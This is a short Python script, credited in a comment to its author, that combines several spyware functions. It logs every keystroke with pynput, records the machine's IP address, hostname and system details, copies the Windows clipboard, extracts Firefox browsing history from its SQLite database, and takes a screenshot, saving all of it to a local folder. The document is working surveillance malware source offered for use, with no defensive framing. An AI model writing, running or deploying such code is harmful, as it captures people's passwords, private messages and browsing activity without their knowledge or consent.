# Import necessary libraries
import platform  # For accessing platform-specific information
import pandas as pd  # For data manipulation and analysis
import socket  # For networking and obtaining IP address
import datetime  # For working with dates and times
import os  # For interacting with the operating system
from PIL import ImageGrab  # For capturing screenshots
import sqlite3  # For interacting with SQLite databases
from pynput.keyboard import Key, Listener  # For handling keyboard events (keystroke logging)

# Define a folder to save the files
save_folder = "saved_files"
os.makedirs(save_folder, exist_ok=True)  # Create the folder if it doesn't exist

# 1. Keystroke logging
k = []

def on_press(key):
    """
    Callback function to handle key press events.
    """
    k.append(key)
    write_file(k)

def write_file(var):
    """
    Write the keystroke data to a file.
    """
    file_path = os.path.join(save_folder, "logs.txt")
    with open(file_path, "a") as f:
        for i in var:
            new_var = str(i).replace("'", "")
            f.write(new_var)
            f.write(" ")
        f.write("\n")  # Add newline after each keypress group
    k.clear()  # Clear the list after writing to the file

def on_release(key):
    """
    Callback function to handle key release events.
    """
    if key == Key.esc:
        # Stop the listener when 'esc' is pressed
        return False

try:
    # Start the keystroke listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error in keylogger: {e}")

# 2. Computer info
date = datetime.date.today()
ip_address = socket.gethostbyname(socket.gethostname())
processor = platform.processor()
system = platform.system()
release = platform.release()
host_name = socket.gethostname()

# Collect computer information
data = {
    'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date, ip_address, processor, system, release, host_name]
}
try:
    df = pd.DataFrame(data)
    computer_info_path = os.path.join(save_folder, 'computer_info.xlsx')
    df.to_excel(computer_info_path, index=False)
    print(f"Computer info saved to {computer_info_path}")
except Exception as e:
    print(f"Error saving computer info: {e}")

# 3. Clipboard info (Windows only)
clipboard_info_path = os.path.join(save_folder, "clipboard.txt")  # Define path outside the function

if platform.system() == "Windows":
    import win32clipboard

    def copy_clipboard():
        """
        Copy clipboard data and save it to a file.
        """
        current_date = datetime.datetime.now()
        try:
            with open(clipboard_info_path, "a") as f:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("\n")
                f.write("Date and time: " + str(current_date) + "\n")
                f.write("Clipboard data: \n" + pasted_data)
        except Exception as e:
            print(f"Error copying clipboard data: {e}")

    try:
        copy_clipboard()
        print(f"Clipboard info saved to {clipboard_info_path}")
    except Exception as e:
        print(f"Error copying clipboard data: {e}")
else:
    print("Clipboard functionality is not available on this platform.")

# 4. Browser history
def extract_history(browser_name, db_path, query, output_file):
    """
    Extract browsing history from a browser's database and save it to a file.
    """
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute(query)
        history = cursor.fetchall()

        df = pd.DataFrame(history, columns=['url', 'title', 'timestamp'])
        output_path = os.path.join(save_folder, output_file)
        df.to_excel(output_path, index=False)
        conn.close()
        print(f"{browser_name} history has been saved to {output_path}.")
    except Exception as e:
        print(f"Error accessing {browser_name} history database: {e}")

if platform.system() == "Windows":
    # Firefox History
    firefox_profile_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
    firefox_profiles = [d for d in os.listdir(firefox_profile_path) if d.endswith('.default-release')]
    for profile in firefox_profiles:
        firefox_db_path = os.path.join(firefox_profile_path, profile, 'places.sqlite')
        extract_history("Firefox", firefox_db_path,
                        "SELECT url, title, datetime(visit_date/1000000,'unixepoch') AS visit_date FROM moz_places LEFT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id",
                        "firefox_history.xlsx")
else:
    print("Browser history functionality is only available on Windows.")

# 5. Screenshot
try:
    if platform.system() == "Windows" or platform.system() == "Darwin":  # macOS and Windows
        screenshot_path = os.path.join(save_folder, "screenshot.png")
        im = ImageGrab.grab()
        im.save(screenshot_path)
        print(f"Screenshot saved as {screenshot_path}")
    else:
        print("Screenshot functionality is not available on this platform.")
except Exception as e:
    print(f"Error taking screenshot: {e}")

# Coded by Abhijeet Kumawat
